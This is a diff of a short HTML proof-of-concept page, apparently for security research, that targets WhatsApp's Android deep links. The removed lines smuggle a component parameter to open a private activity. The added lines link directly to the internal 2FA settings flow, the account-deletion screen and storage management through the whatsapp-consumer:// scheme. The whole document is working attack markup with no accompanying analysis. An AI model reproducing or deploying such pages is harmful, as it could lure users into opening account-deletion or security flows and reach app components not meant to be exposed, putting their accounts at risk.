@@ -3,12 +3,17 @@
   <body>
     <h1>Security Research PoC</h1>
     <!-- The browser will treat this as a standard deep link, which is fully valid -->
-    <a href="whatsapp-consumer://settings/storage-management">Click to Test Proxy</a>
+    <a href="whatsapp://send?text=CheckThisOut">Click to Test Proxy</a>
     
     <!-- Or trigger the smuggled intent route directly -->
-    <a href="whatsapp://send?text=payload&component=com.whatsapp.waffle.sso.ui.LinkedUsersActivity">
-      Trigger Private Component
+    <a href="whatsapp-consumer://settings/account/2fa?continueTo=999">
+      Click to Trigger Internal 2FA Flow
     </a>
-
+    <a href="whatsapp-consumer://settings/account/delete">
+      Click to Trigger Internal delete
+    </a>
+    <a href="whatsapp-consumer://settings/storage-management">
+      Click to Trigger storage
+    </a>
   </body>
 </html>
